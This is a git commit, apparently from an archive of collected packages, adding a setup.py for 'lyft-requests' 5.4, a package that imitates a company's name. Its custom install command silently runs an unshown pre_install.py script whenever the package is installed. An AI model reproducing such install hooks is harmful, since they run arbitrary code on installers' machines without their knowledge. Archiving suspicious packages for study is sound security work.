bf80c78072aaff082f7d1b72b63661f4640a02c1
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-03-17 14:04:55 +0000

    Add package lyft-requests/5.4/lyft-requests-5.4.tar.gz

---
+++ packages/lyft-requests/lyft-requests-5.4.tar.gz/lyft-requests-5.4/setup.py
@@ -0,0 +1,37 @@
+from distutils.core import setup
+from setuptools import setup
+from setuptools.command.install import install
+import subprocess
+
+class CustomInstall(install):
+    def run(self):
+        # Execute your pre_install.py script
+        subprocess.run(["python", "pre_install.py"])
+        # Call the original install command
+        install.run(self)
+
+
+setup(
+  name = 'lyft-requests',      
+  packages = ['lyft-requests'],  
+  version = '5.4',      
+  license='MIT',        
+  description = 'Lyft service',  
+  author = 'SherlocksHat',              
+  author_email = 'sherlockshat007@gmail.com',    
+  url = 'https://github.com/user/sherlockshat',  
+  download_url = 'http://notapplicable.notapplicable',   
+  keywords = ['Lyft', 'FRONTEND'], 
+  install_requires=[],
+  classifiers=[
+    'Development Status :: 3 - Alpha', 
+    'Intended Audience :: Developers', 
+    'Topic :: Software Development :: Build Tools',
+    'License :: OSI Approved :: MIT License',  
+    'Programming Language :: Python :: 3',   
+    'Programming Language :: Python :: 3.4',
+    'Programming Language :: Python :: 3.5',
+    'Programming Language :: Python :: 3.6',
+  ],
+   cmdclass={'install': CustomInstall},
+)
